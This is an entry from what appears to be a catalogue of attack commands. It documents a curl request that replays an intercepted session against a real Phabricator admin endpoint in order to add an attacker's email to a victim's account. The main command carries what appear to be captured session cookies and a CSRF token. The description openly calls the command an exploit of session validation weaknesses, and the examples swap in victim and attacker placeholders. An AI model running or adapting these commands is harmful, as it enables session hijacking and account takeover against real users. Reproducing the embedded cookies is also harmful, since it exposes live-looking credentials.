---
id: add-email-post-uuid
name: phabricator-add-email-post
type: command
executor: curl
data: >-
  curl -X POST
  'https://admin.phacility.com/settings/user/(username)/page/email/' -H
  'X-Phabricator-Csrf: B [@5xu5frjn4f5238616917563d]' -H 'Cookie:
  aura=u2FOcME6PSlT; admin_phusr=amer17;
  admin_phsid=ld7bdwzjadvg5x3go3wykgzj3blk3qrdidlqd452; halo=9LIv4U24kVpa' -d
  'csrf=B%402hmxctpgc672d004d5b2cc5c&form=1&dialog=1&new=true&email=asuuu17%40gmail.com&submit=true&wflow=true&ajax=true&metablock=3'
output: HTTP/1.1 200 OK or redirect indicating success
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.824Z'
platforms:
  - Linux
  - Web
tags:
  - http-post
  - request-replay
  - phabricator
verified: false
validated: true
submitted: true
---

# phabricator-add-email-post

## Command

```bash
curl -X POST 'https://admin.phacility.com/settings/user/(username)/page/email/' \
  -H 'X-Phabricator-Csrf: B [@5xu5frjn4f5238616917563d]' \
  -H 'Cookie: aura=u2FOcME6PSlT; admin_phusr=amer17; admin_phsid=ld7bdwzjadvg5x3go3wykgzj3blk3qrdidlqd452; halo=9LIv4U24kVpa' \
  -d 'csrf=B%402hmxctpgc672d004d5b2cc5c&form=1&dialog=1&new=true&email=asuuu17%40gmail.com&submit=true&wflow=true&ajax=true&metablock=3'
```

## Description

This curl command replays a modified POST request to add an email to a Phabricator user's settings, exploiting session validation weaknesses. Use after interception to inject attacker email.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `URL` | Target endpoint with username | Yes |
| `-H 'X-Phabricator-Csrf'` | CSRF token header | Yes |
| `-H 'Cookie'` | Session cookies | Yes |
| `-d` | POST body with parameters like email, csrf | Yes |
| `email` | Email to add (URL-encoded) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://admin.phacility.com/settings/user/victim/page/email/' -H 'X-Phabricator-Csrf: token' -H 'Cookie: session' -d 'email=attacker@example.com&csrf=token&submit=true'
```

### Advanced Usage

Include full headers and parameters as captured:

```bash
curl -X POST 'https://admin.phacility.com/settings/user/victim/page/email/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'X-Phabricator-Csrf: B [@token]' \
  -H 'Cookie: full-session-cookies' \
  -d 'csrf=encoded&form=1&new=true&email=attacker%40gmail.com&submit=true'
```

## Expected Output

Successful response: HTTP 200 with JSON or HTML indicating email added, or redirect to settings page. Failure: 403 if tokens invalid.

## Related

- [[Related Procedure: Modify-and-Replay-Email-Addition-Request]]
